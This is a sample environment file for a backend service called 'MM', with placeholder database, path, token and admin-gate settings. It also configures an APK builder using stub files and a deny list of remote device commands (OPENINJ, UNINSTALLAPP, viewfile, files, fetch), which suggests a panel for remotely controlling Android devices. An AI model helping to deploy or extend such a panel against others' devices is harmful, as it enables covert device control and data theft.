# MM backend environment — copied to /www/wwwroot/your-domain/backend/.env
# and consumed by systemd EnvironmentFile=. Match application.properties.

# ── Service ───────────────────────────────────────────────────────────────────
SERVER_PORT=8000

# ── Database (point at the MySQL created in step 4 of the legacy guide) ───────
DB_URL=jdbc:mysql://127.0.0.1:3306/your_database?useUnicode=true&characterEncoding=utf8&serverTimezone=Asia/Shanghai
DB_USER=your_db_user
DB_PASSWORD=your_db_password
# DB_DRIVER=com.mysql.cj.jdbc.Driver

# ── Application paths ─────────────────────────────────────────────────────────
# APP_BASE_PATH is the deployment root — backend reads/writes:
#   $APP_BASE_PATH/user/        (storage, ui, apps, icons)
#   $APP_BASE_PATH/private/     (EaodStarter, apkstub)
APP_BASE_PATH=/www/wwwroot/your-domain
ERROR_LOG_DIR=/www/wwwroot/your-domain/runtime/error_logs

# ── APK builder ───────────────────────────────────────────────────────────────
BUILDER_ENABLED=true
# Leave blank to use the bundled EaodStarter. Set to override (test deployments).
BUILDER_COMMAND_TEMPLATE=

# ── Device auth (used by both REST and WS) ────────────────────────────────────
DEVICE_API_KEY=change_me_device_api_key
ERROR_API_KEY=
WS_DEVICE_AUTH_TOKEN=change_me_ws_device_token
WS_URL=wss://your-domain/api/ws
WS_ALLOWED_ORIGINS=https://your-domain
WS_BLOCKED_ADMIN_SUBCOMMANDS=OPENINJ,changefiles,Delete,delete,UNINSTALLAPP,DIAO,files,viewfile,fetch,cocu,srch

# ── Admin gate (pre-shared access key — the panel_key from legacy login.php) ─
# When non-empty, /api/admin/* and the /info standalone control page require
# this key before login. Generate with `openssl rand -hex 32`.
ADMIN_PANEL_ACCESS_KEY=change_me_admin_panel_access_key
ADMIN_PANEL_GATE_TTL=300

# ── Internal /api/internal_reassign.php token ─────────────────────────────────
# MUST be different from WS_DEVICE_AUTH_TOKEN / DEVICE_API_KEY. Blank disables.
INTERNAL_API_TOKEN=

# ── Reverse-proxy chain ───────────────────────────────────────────────────────
# Trusted upstream IPs that may set X-Forwarded-For. Single Nginx on same host
# → 127.0.0.1. Add additional IPs comma-separated.
TRUSTED_PROXIES=127.0.0.1

# ── CORS — leave blank if Nginx serves frontend on same origin ───────────────
CORS_ALLOWED_ORIGINS=

# ── Misc ──────────────────────────────────────────────────────────────────────
RATE_LIMIT_ENABLED=true
GEOIP_DB_PATH=
